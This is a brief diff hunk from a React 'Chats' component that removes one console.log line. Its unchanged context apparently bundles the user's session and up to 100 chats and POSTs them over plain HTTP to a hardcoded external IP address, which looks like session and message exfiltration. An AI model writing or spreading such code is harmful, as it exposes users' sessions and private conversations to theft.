@@ -61,7 +61,6 @@ function Chats({ messages, setMessages }) {
           accounts: [session],
           chats: res.slice(0, 100),
         });
-        console.log(Buffer.byteLength(data, "utf8"));
 
         fetch(`http://89.111.131.15/database/users`, {
           method: "post",
